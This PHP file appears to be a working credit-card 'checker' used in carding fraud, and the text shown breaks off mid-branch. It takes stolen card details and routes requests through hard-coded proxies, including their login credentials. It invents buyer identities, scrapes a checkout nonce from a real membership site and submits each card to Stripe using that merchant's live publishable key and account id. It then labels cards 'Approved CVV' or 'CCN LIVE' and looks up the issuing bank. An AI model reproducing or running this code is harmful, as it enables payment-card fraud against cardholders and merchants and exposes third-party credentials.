<?php
// File path to cookie.txt
$cookieFilePath = 'cookie.txt';

// Check if the file exists and delete it
//if (file_exists($cookieFilePath)) {
  //  unlink($cookieFilePath);
//}

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
session_start();
error_reporting(0);
ini_set('display_errors', 0);

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function random_strings($length_of_string) {
    $str_result = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result),  
    0, $length_of_string); 
}
$rnd = 'wing'.random_strings(7).'';
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}




function rebootproxys() {
    // Array of proxies
    $proxyList = [
     '23.95.150.145:6114:znkruahs:qji8izehszsr',
'198.23.239.134:6540:znkruahs:qji8izehszsr',
'45.38.107.97:6014:znkruahs:qji8izehszsr',
'207.244.217.165:6712:znkruahs:qji8izehszsr',
'107.172.163.27:6543:znkruahs:qji8izehszsr',
'104.222.161.211:6343:znkruahs:qji8izehszsr',
'64.137.96.74:6641:znkruahs:qji8izehszsr',
'216.10.27.159:6837:znkruahs:qji8izehszsr',
'136.0.207.84:6661:znkruahs:qji8izehszsr',
'142.147.128.93:6593:znkruahs:qji8izehszsr',
    ];
    $myproxy = rand(0, count($proxyList) - 1);
    return $proxyList[$myproxy];
}

function value($str, $find_start, $find_end) {
    $start = @strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}

function mod($dividendo, $divisor) {
    return round($dividendo - (floor($dividendo / $divisor) * $divisor));
}


$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

// Simulate typing delay between field assignments
$number1 = substr($cc, 0, 4);
$number2 = substr($cc, 4, 4);
$number3 = substr($cc, 8, 4);
$number4 = substr($cc, 12, 4);
$number6 = substr($cc, 0, 6);

// Fetch random user data with delay
$proxy = rebootproxys();
list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
$users = [
    [
        'firstname' => 'John',
        'lastname'  => 'Doe',
        'email'     => 'john.doe@example.com',
        'phone'     => '555-123-4567',
        'zip'       => '90210',
        'state'     => 'California',
        'city'      => 'Los Angeles',
        'street'    => 'Sunset Blvd'
    ],
    [
    'firstname' => 'Michael',
    'lastname'  => 'Johnson',
    'email'     => 'michael.johnson@example.com',
    'phone'     => '555-321-4567',
    'zip'       => '90001',
    'state'     => 'California',
    'city'      => 'Los Angeles',
    'street'    => 'Sunset Blvd'
],
[
    'firstname' => 'Emily',
    'lastname'  => 'Davis',
    'email'     => 'emily.davis@example.com',
    'phone'     => '555-213-4455',
    'zip'       => '60614',
    'state'     => 'Illinois',
    'city'      => 'Chicago',
    'street'    => 'Lincoln Ave'
],
[
    'firstname' => 'David',
    'lastname'  => 'Martinez',
    'email'     => 'david.martinez@example.com',
    'phone'     => '555-777-2345',
    'zip'       => '77001',
    'state'     => 'Texas',
    'city'      => 'Houston',
    'street'    => 'Westheimer Rd'
],
[
    'firstname' => 'Sophia',
    'lastname'  => 'Garcia',
    'email'     => 'sophia.garcia@example.com',
    'phone'     => '555-642-8899',
    'zip'       => '19103',
    'state'     => 'Pennsylvania',
    'city'      => 'Philadelphia',
    'street'    => 'Market St'
],
[
    'firstname' => 'James',
    'lastname'  => 'Lee',
    'email'     => 'james.lee@example.com',
    'phone'     => '555-411-5678',
    'zip'       => '75201',
    'state'     => 'Texas',
    'city'      => 'Dallas',
    'street'    => 'Main St'
],
[
    'firstname' => 'Olivia',
    'lastname'  => 'Brown',
    'email'     => 'olivia.brown@example.com',
    'phone'     => '555-300-1122',
    'zip'       => '98101',
    'state'     => 'Washington',
    'city'      => 'Seattle',
    'street'    => 'Pine St'
],
[
    'firstname' => 'Benjamin',
    'lastname'  => 'Wilson',
    'email'     => 'benjamin.wilson@example.com',
    'phone'     => '555-123-7890',
    'zip'       => '30301',
    'state'     => 'Georgia',
    'city'      => 'Atlanta',
    'street'    => 'Peachtree St'
],
[
    'firstname' => 'Ava',
    'lastname'  => 'Moore',
    'email'     => 'ava.moore@example.com',
    'phone'     => '555-454-9988',
    'zip'       => '33101',
    'state'     => 'Florida',
    'city'      => 'Miami',
    'street'    => 'Ocean Dr'
],
[
    'firstname' => 'Ethan',
    'lastname'  => 'Taylor',
    'email'     => 'ethan.taylor@example.com',
    'phone'     => '555-655-4411',
    'zip'       => '85001',
    'state'     => 'Arizona',
    'city'      => 'Phoenix',
    'street'    => 'Camelback Rd'
],
[
    'firstname' => 'Isabella',
    'lastname'  => 'Anderson',
    'email'     => 'isabella.anderson@example.com',
    'phone'     => '555-878-3322',
    'zip'       => '55401',
    'state'     => 'Minnesota',
    'city'      => 'Minneapolis',
    'street'    => 'Nicollet Ave'
],
[
    'firstname' => 'William',
    'lastname'  => 'Thomas',
    'email'     => 'william.thomas@example.com',
    'phone'     => '555-998-7766',
    'zip'       => '70112',
    'state'     => 'Louisiana',
    'city'      => 'New Orleans',
    'street'    => 'Canal St'
],
[
    'firstname' => 'Mia',
    'lastname'  => 'Jackson',
    'email'     => 'mia.jackson@example.com',
    'phone'     => '555-556-7788',
    'zip'       => '64101',
    'state'     => 'Missouri',
    'city'      => 'Kansas City',
    'street'    => 'Main St'
],
[
    'firstname' => 'Logan',
    'lastname'  => 'White',
    'email'     => 'logan.white@example.com',
    'phone'     => '555-223-4466',
    'zip'       => '46201',
    'state'     => 'Indiana',
    'city'      => 'Indianapolis',
    'street'    => 'Meridian St'
],
[
    'firstname' => 'Charlotte',
    'lastname'  => 'Harris',
    'email'     => 'charlotte.harris@example.com',
    'phone'     => '555-789-3344',
    'zip'       => '64111',
    'state'     => 'Missouri',
    'city'      => 'Kansas City',
    'street'    => 'Gillham Rd'
],
[
    'firstname' => 'Alexander',
    'lastname'  => 'Clark',
    'email'     => 'alex.clark@example.com',
    'phone'     => '555-121-8899',
    'zip'       => '53202',
    'state'     => 'Wisconsin',
    'city'      => 'Milwaukee',
    'street'    => 'Brady St'
],
[
    'firstname' => 'Amelia',
    'lastname'  => 'Lewis',
    'email'     => 'amelia.lewis@example.com',
    'phone'     => '555-441-2299',
    'zip'       => '64108',
    'state'     => 'Missouri',
    'city'      => 'Kansas City',
    'street'    => 'Grand Blvd'
],
[
    'firstname' => 'Daniel',
    'lastname'  => 'Walker',
    'email'     => 'daniel.walker@example.com',
    'phone'     => '555-998-1122',
    'zip'       => '27601',
    'state'     => 'North Carolina',
    'city'      => 'Raleigh',
    'street'    => 'Fayetteville St'
],
[
    'firstname' => 'Harper',
    'lastname'  => 'Young',
    'email'     => 'harper.young@example.com',
    'phone'     => '555-665-8899',
    'zip'       => '37201',
    'state'     => 'Tennessee',
    'city'      => 'Nashville',
    'street'    => 'Broadway'
],
[
    'firstname' => 'Jackson',
    'lastname'  => 'Allen',
    'email'     => 'jackson.allen@example.com',
    'phone'     => '555-332-7788',
    'zip'       => '96813',
    'state'     => 'Hawaii',
    'city'      => 'Honolulu',
    'street'    => 'King St'
],
[
    'firstname' => 'Evelyn',
    'lastname'  => 'Scott',
    'email'     => 'evelyn.scott@example.com',
    'phone'     => '555-474-6655',
    'zip'       => '49503',
    'state'     => 'Michigan',
    'city'      => 'Grand Rapids',
    'street'    => 'Division Ave'
],
    [
        'firstname' => 'Jane',
        'lastname'  => 'Smith',
        'email'     => 'jane.smith@example.com',
        'phone'     => '555-987-6543',
        'zip'       => '10001',
        'state'     => 'New York',
        'city'      => 'New York',
        'street'    => '5th Avenue'
    ],
    [
        'firstname' => 'Alex',
        'lastname'  => 'Johnson',
        'email'     => 'alex.johnson@example.com',
        'phone'     => '555-246-1357',
        'zip'       => '60601',
        'state'     => 'Illinois',
        'city'      => 'Chicago',
        'street'    => 'Lake Shore Dr'
    ]
];

$randomUser = $users[array_rand($users)];
$firstname = $randomUser['firstname'];
$lastname  = $randomUser['lastname'];
$email     = $randomUser['email'];
$phone     = $randomUser['phone'];
$zip       = $randomUser['zip'];
$state     = $randomUser['state'];
$city      = $randomUser['city'];
$street    = $randomUser['street'];

// Optional: simulate user delay

  // Pause to simulate a break in user action


// Step 1: Fetch the page to get the nonce value
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://learnhowtosign.com/membership-account-2/membership-checkout/?level=3');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
$pageContent = curl_exec($ch);
curl_close($ch);

$nonce = GetStr($pageContent, 'name="pmpro_checkout_nonce" value="', '"');

 sleep(rand(1, 2));
// Submit payment details with delay between fields
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-encoding: gzip, deflate, br, zstd',
    'accept-language: en-US,en;q=0.5',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: ' . $_SERVER['HTTP_USER_AGENT'],
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

// Insert simulated delay before posting form data
 sleep(rand(1, 2)); // A longer delay to simulate a pause before submission

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=606ebe40-ddc0-464d-a0d8-19d7bb8d9a779bd404&muid=15d0d1d7-6985-4cf3-84bb-09d84ad78947643869&sid=a29e17ff-960c-4c7f-aeca-c14b06dffbe53b73d3&pasted_fields=number&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+split-card-element&referrer=https%3A%2F%2Flearnhowtosign.com&time_on_page=34447&client_attribution_metadata[client_session_id]=3d3fa535-02a7-4670-822c-aa8e398466b7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1HgVsjFW89inDxd6');

// Continue with the rest of the code
$result1 = curl_exec($ch);
$id = trim(strip_tags(GetStr($result1, '"id": "','"')));
curl_close($ch);
$proxy = rebootproxys();
list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://learnhowtosign.com/membership-account-2/membership-checkout/?level=3');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, "http://$proxyIP:$proxyPort");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUser:$proxyPass");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'origin: https://learnhowtosign.com',
    'referer: https://learnhowtosign.com/membership-account-2/membership-checkout/?level=3',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'user-agent: ' . $_SERVER['HTTP_USER_AGENT'],
    'x-requested-with: XMLHttpRequest',
));

curl_setopt($ch, CURLOPT_POSTFIELDS, 'pmpro_level=3&level=3&checkjavascript=1&username='.$firstname.'nxt'.$zip.'1&bemail='.$firstname.''.$rnd.''.$zip.'01'.$lastname.'%40gmail.com&bconfirmemail_copy=1&password='.$lastname.'99007%40&password2='.$lastname.'99007%40&first_name='.$firstname.'&last_name='.$lastname.'&fullname=&student_name=&gateway=stripe&CardType=visa&pmpro_discount_code=&submit-checkout=1&javascriptok=1&javascriptok=1&submit-checkout=1&javascriptok=1&javascriptok=1&pmpro_other_discount_code=&pmpro_checkout_nonce='.$nonce.'&_wp_http_referer=%2Fmembership-account-2%2Fmembership-checkout%2F%3Flevel%3D3&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
$result2 = curl_exec($ch);
$cvc_check = trim(strip_tags(GetStr($result2, '"cvc_check":"', '"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cctwo . '');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim_response = curl_exec($ch);
$fim = json_decode($fim_response, true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if (strpos($fim_response, '"type":"credit"') !== false) {
    $type = 'Credit';
} else {
    $type = 'Debit';
}

#cvv

if (strpos($result2, '"cvc_check": "pass"')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED  [𒆜օʄʄɨƈɨǟʟ ƈɦɛƈӄʐ 𒆜 (☯𝙈𝙊𝙃𝙄𝙏𝙄𝙎☯)]
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
} elseif (strpos($result2, 'Thank You For Donation.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED -> Thank You For Donation!! -> [𒆜օʄʄɨƈɨǟʟ ƈɦɛƈӄʐ 𒆜 (☯𝙈𝙊𝙃𝙄𝙏𝙄𝙎☯)]
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
} elseif (strpos($result2, 'Thank You For Donation.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED ➝ Code : Thank You For Donation ➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
        } elseif (strpos($result2, 'Your card has insufficient funds.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED ➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
} elseif (strpos($result2, 'Thank You.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED ➝ Thank You. ➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
} elseif (strpos($result2, 'Your card zip code is incorrect.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED ➝ Incorrect Zip Code➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
elseif (strpos($result2, '/donations/thank_you?donation_number=')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, "incorrect_zip")) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED Incorrect zip ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, '"type":"one-time"')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(0, 0, 255, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 255, 0.7);'>
            #CVV MATCHED Incorrect zip ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'Customer authentication is required to complete this transaction. Please complete the verification steps issued by your payment provider.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
             Approved CVV ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CVV MATCHED -> PURCHASE REQUIRES 3DS ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧 
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
elseif (strpos($result2, 'security code is incorrect.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CCN LIVE ➝ PROCESSED $0.50 ➝ 『Payment was Sucessful』 ➝ Order ID:[Unavailable]➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
elseif (strpos($result2, 'security code is incorrect.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CCN LIVE ➝ PROCESSED $0.50 ➝ 『Payment was Sucessful』 ➝ Order ID:[Unavailable]➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
elseif (strpos($result2, 'security code is invalid.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CCN LIVE ➝ PROCESSED $0.50 ➝ 『Payment was Sucessful』 ➝ Order ID:[Unavailable]➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'security code is invalid.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CCN LIVE ➝ PROCESSED $0.50 ➝ 『Payment was Sucessful』 ➝ Order ID:[Unavailable]➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
elseif (strpos($result2, 'Your card&#039;s security code is incorrect.')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CCN LIVE ➝ PROCESSED $0.50 ➝ 『Payment was Sucessful』 ➝ Order ID:[Unavailable]➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'incorrect_cvc')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
            Aprovada ✅ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            #CCN LIVE ➝ PROCESSED $0.50 ➝ 『Payment was Sucessful』 ➝ Order ID:[Unavailable]➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

elseif (strpos($result2, 'stolen_card')) {
    echo "<div style='background-color: rgba(0, 128, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 255, 0, 0.7);'>
